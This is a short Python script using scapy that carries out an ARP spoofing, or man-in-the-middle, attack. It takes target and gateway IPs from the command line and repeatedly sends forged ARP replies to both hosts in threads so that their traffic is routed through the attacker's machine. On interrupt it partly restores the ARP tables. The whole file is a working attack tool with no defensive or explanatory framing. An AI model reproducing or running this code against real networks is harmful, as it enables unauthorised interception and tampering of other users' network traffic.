#!/usr/bin/env python
try:

	import scapy.all as scapy
	import time
	import sys
	import os
	import optparse
	import threading

except:
	print(f"[+] install librarys! ...")


def getArg():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="target", help="target IP")
	parser.add_option("-s", "--scr", dest="getway", help="router IP")
	(options, arguments) = parser.parse_args() 
	if not options.target:
		parser.error("[-] spicefy an target")
	elif not options.getway:
		parser.error("[-] spicefy an getway")
	return options


def get_mac(ip):

	arp_requests = scapy.ARP(pdst=ip)   #send requests how has ip
	#arp_requests.show()
	brodcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")  #send packet from my mac address to ff:ff:ff:ff:ff:ff 
	#brodcast.show() 
	arp_requests_brocast = brodcast/arp_requests
	#ip_requests_brocast.show()
	answerd_list = scapy.srp(arp_requests_brocast, timeout=2)[0]
	return answerd_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)


def restore(dst_ip, scr_ip):
	dst_mac = get_mac(dst_ip)
	scr_mac = get_mac(scr_ip)
	packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=scr_ip, hwsrc=scr_mac)
	scapy.send(packet, count=4)

options= getArg()

target_ip = options.target #"192.168.1.11"
getway_ip = options.getway

count = 0
try:
	while True:
		count += 2
		thread1 = threading.Thread(target=spoof, args=(target_ip, getway_ip))
		thread2 = threading.Thread(target=spoof, args=(getway_ip, target_ip))
		thread1.start()
		thread2.start()
		#spoof(target_ip, getway_ip)
		#spoof(getway_ip, target_ip)
		print("\rspoofing ..." + "packets sent "+ str(count), end=" ")
		time.sleep(1)
		os.system('clear')
except KeyboardInterrupt:
	os.system('clear')
	print("\n[+] CTRL+ C ..... resetting ARP Tabels...")
	restore(getway_ip, target_ip)
